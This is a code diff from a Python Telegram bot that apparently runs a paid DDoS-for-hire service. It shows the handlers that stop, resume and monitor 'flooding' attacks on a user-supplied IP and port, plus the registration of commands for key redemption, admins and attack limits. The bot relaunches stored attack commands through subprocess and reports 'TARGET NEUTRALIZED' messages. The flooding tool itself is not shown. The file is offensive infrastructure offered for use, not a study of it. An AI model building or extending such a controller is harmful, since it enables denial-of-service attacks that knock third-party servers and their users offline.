@@ -460,4 +460,72 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
         await update.message.reply_text("❌ ACCESS DENIED!\nRedeem a valid key from @vofuxk.")
         return
-    if user_id not in user_processes or user_pr
+    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
+        await update.message.reply_text("No active attack to halt.\nOWNER @vofuxk")
+        return
+    user_processes[user_id]["process"].terminate()
+    del user_processes[user_id]
+    await update.message.reply_text(
+        "🛑 OPERATION HALTED! 🛑\n\n"
+        "⚡ ALL FLOODING STOPPED.\n"
+        "🛡️ SYSTEM SECURED.\n"
+        "🔐 PARAMETERS CLEARED.\n\n"
+        "Courtesy of @vofuxk"
+    )
+
+# /resume: Restart an attack (if needed)
+async def resume(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
+        await update.message.reply_text("No active operation. Use /bgmi to initiate an attack.")
+        return
+    user_processes[user_id]["process"] = subprocess.Popen(user_processes[user_id]["command"])
+    await update.message.reply_text("🔥 ATTACK RESUMED! 🔥")
+
+# Monitor attack: When an attack finishes, send a notification.
+async def monitor_attack(user_id: str, context: ContextTypes.DEFAULT_TYPE, process: subprocess.Popen):
+    loop = asyncio.get_event_loop()
+    await loop.run_in_executor(None, process.wait)
+    try:
+        target_ip = user_processes[user_id]["target_ip"]
+        port = user_processes[user_id]["port"]
+        duration = user_processes[user_id]["duration"]
+    except KeyError:
+        return  # If user_processes entry is gone, exit silently.
+    await context.bot.send_message(
+        chat_id=int(user_id),
+        text=(
+            f"🔥 MISSION ACCOMPLISHED! 🔥\n\n"
+            f"🎯 TARGET NEUTRALIZED: {target_ip}\n"
+            f"💣 PORT BREACHED: {port}\n"
+            f"⏳ DURATION: {duration} seconds\n\n"
+            f"💥 Operation Complete. Courtesy of @vofuxk"
+        )
+    )
+
+if __name__ == '__main__':
+    load_data()
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+
+    # Existing handlers
+    app.add_handler(CommandHandler("redeem", redeem))
+    app.add_handler(CommandHandler("genkey", genkey))
+    app.add_handler(CommandHandler("allusers", allusers))
+    app.add_handler(CommandHandler("bgmi", bgmi))
+    app.add_handler(CommandHandler("stop", stop))
+    app.add_handler(CommandHandler("resume", resume))
+
+    # New handlers for additional functionalities
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("when", when))
+    app.add_handler(CommandHandler("revoke", revoke))
+    app.add_handler(CommandHandler("attack_limit", attack_limit))
+    app.add_handler(CommandHandler("status", status))
+    app.add_handler(CommandHandler("backup", backup))
+    app.add_handler(CommandHandler("download_backup", download_backup))
+    app.add_handler(CommandHandler("set_cooldown", set_cooldown))
+    app.add_handler(CommandHandler("add_admin", add_admin))
+    app.add_handler(CommandHandler("remove_admin", remove_admin))
+
+    app.run_polling()
